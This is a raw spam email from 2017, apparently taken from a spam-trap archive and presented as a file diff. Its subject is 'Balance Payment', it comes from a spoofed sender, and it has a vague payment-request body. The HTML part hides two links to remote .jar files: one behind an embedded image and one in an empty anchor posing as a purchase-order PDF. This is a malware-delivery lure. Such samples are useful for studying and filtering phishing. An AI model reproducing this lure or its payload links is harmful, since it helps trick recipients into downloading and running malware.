@@ -1,0 +1,112 @@
+Delivered-To: bruce@untroubled.org
+Received: (fqmail 28775 invoked from network); 01 May 2017 19:18:23 -0000
+Received: from mx16.futurequest.net (mx16.futurequest.net [69.5.6.192])
+  by 10.170.1.191 ([10.170.1.191])
+  with FQDP via TCP; 01 May 2017 19:18:23 -0000
+Received: (qmail 26734 invoked from network); 1 May 2017 19:18:23 -0000
+Received: from mail01.snoopymuseum.tokyo (mail02.snoopymuseum.tokyo [52.192.249.37])
+  by mx16.futurequest.net ([69.5.6.192])
+  with ESMTP via TCP; 01 May 2017 19:18:22 -0000
+Received: from [192.168.1.103] (unknown [58.136.90.153])
+	by mail01.snoopymuseum.tokyo (Postfix) with ESMTPA id 20C07817C0
+	for <bruce@untroubled.org>; Tue,  2 May 2017 04:17:36 +0900 (JST)
+Content-Type: multipart/alternative; boundary="===============1923563729=="
+MIME-Version: 1.0
+Subject: Balance  Payment
+To: bruce@untroubled.org
+From: "Romaan Surkhab  " <fureai-info@kissport.or.jp>
+Date: Tue, 02 May 2017 02:17:33 +0700
+Content-Length: 3924
+
+You will not see this in a MIME-aware mail reader.
+--===============1923563729==
+Content-Type: text/plain; charset="iso-8859-1"
+MIME-Version: 1.0
+Content-Transfer-Encoding: quoted-printable
+Content-Description: Mail message body
+
+Hello  Sir ,
+ Please  below  payment, we  look forward to your prompt reply.
+ =
+
+Your early reply is highly appreciated.
+ Best Regards,
+ Romaan Surkhab =
+
+ =
+
+  =
+
+  =
+
+  =
+
+ =20
+
+--===============1923563729==
+Content-Type: multipart/related; boundary="===============1503511058=="
+MIME-Version: 1.0
+
+--===============1503511058==
+Content-Type: text/html; charset="iso-8859-1"
+MIME-Version: 1.0
+Content-Transfer-Encoding: quoted-printable
+Content-Description: Mail message body
+
+<HTML><head><meta http-equiv=3D"Content-Type" content=3D"text/html; charset=
+=3Diso-8859-1"/></head><BODY><P>Hello&nbsp; Sir ,</P>
+<P>Please&nbsp;&nbsp;below&nbsp; payment, we&nbsp; look forward to your pro=
+mpt reply.</P>
+<P><BR>Your early reply is highly appreciated.</P>
+<P>Best Regards,</P>
+<P><SPAN class=3DgD style=3D"FONT-SIZE: 12px; FONT-FAMILY: arial, sans-seri=
+f; VERTICAL-ALIGN: top; WHITE-SPACE: nowrap; WORD-SPACING: 0px; TEXT-TRANSF=
+ORM: none; FONT-WEIGHT: bold; COLOR: rgb(34,34,34); FONT-STYLE: normal; TEX=
+T-ALIGN: left; ORPHANS: 2; WIDOWS: 2; DISPLAY: inline; LETTER-SPACING: norm=
+al; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-liga=
+tures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; t=
+ext-decoration-style: initial; text-decoration-color: initial" email=3D"rom=
+aansurkhab@gmail.com" name=3D"Romaan Surkhab">Romaan Surkhab</SPAN><SPAN st=
+yle=3D"FONT-SIZE: 12px; FONT-FAMILY: arial, sans-serif; WHITE-SPACE: nowrap=
+; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FLOAT: none; FONT-WEIGHT: normal=
+; COLOR: rgb(34,34,34); FONT-STYLE: normal; TEXT-ALIGN: left; ORPHANS: 2; W=
+IDOWS: 2; DISPLAY: inline !important; LETTER-SPACING: normal; BACKGROUND-CO=
+LOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: normal; fo=
+nt-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-st=
+yle: initial; text-decoration-color: initial"><SPAN class=3DApple-converted=
+-space>&nbsp;</SPAN></SPAN></P>
+<P><SPAN style=3D"FONT-SIZE: 12px; FONT-FAMILY: arial, sans-serif; WHITE-SP=
+ACE: nowrap; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FLOAT: none; FONT-WEI=
+GHT: normal; COLOR: rgb(34,34,34); FONT-STYLE: normal; TEXT-ALIGN: left; OR=
+PHANS: 2; WIDOWS: 2; DISPLAY: inline !important; LETTER-SPACING: normal; BA=
+CKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures:=
+ normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-de=
+coration-style: initial; text-decoration-color: initial"><SPAN class=3DAppl=
+e-converted-space><A href=3D"http://ystracker.preferati.com/update/Image774=
+63.jar"><IMG border=3D0 hspace=3D0 alt=3D"" src=3D"cid:embedding-0" align=
+=3Dbaseline></A></SPAN></SPAN></P>
+<P><SPAN style=3D"FONT-SIZE: 12px; FONT-FAMILY: arial, sans-serif; WHITE-SP=
+ACE: nowrap; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FLOAT: none; FONT-WEI=
+GHT: normal; COLOR: rgb(34,34,34); FONT-STYLE: normal; TEXT-ALIGN: left; OR=
+PHANS: 2; WIDOWS: 2; DISPLAY: inline !important; LETTER-SPACING: normal; BA=
+CKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures:=
+ normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-de=
+coration-style: initial; text-decoration-color: initial"><SPAN class=3DAppl=
+e-converted-space></SPAN></SPAN>&nbsp;</P>
+<P><A href=3D"http://colourimpactindia.com/sly/PO88887_PDF.jar"></A>&nbsp;<=
+/P>
+<P>&nbsp;</P>
+<P>&nbsp;</P></BODY></HTML>
+--===============1503511058==
+Content-Type: message/external-body; access-type=x-deleted; length=21612
+
+
+Content-Type: image/jpeg
+MIME-Version: 1.0
+Content-Transfer-Encoding: base64
+Content-ID: <embedding-0>
+Content-Disposition: inline
+
+--===============1503511058==--
+
+--===============1923563729==--
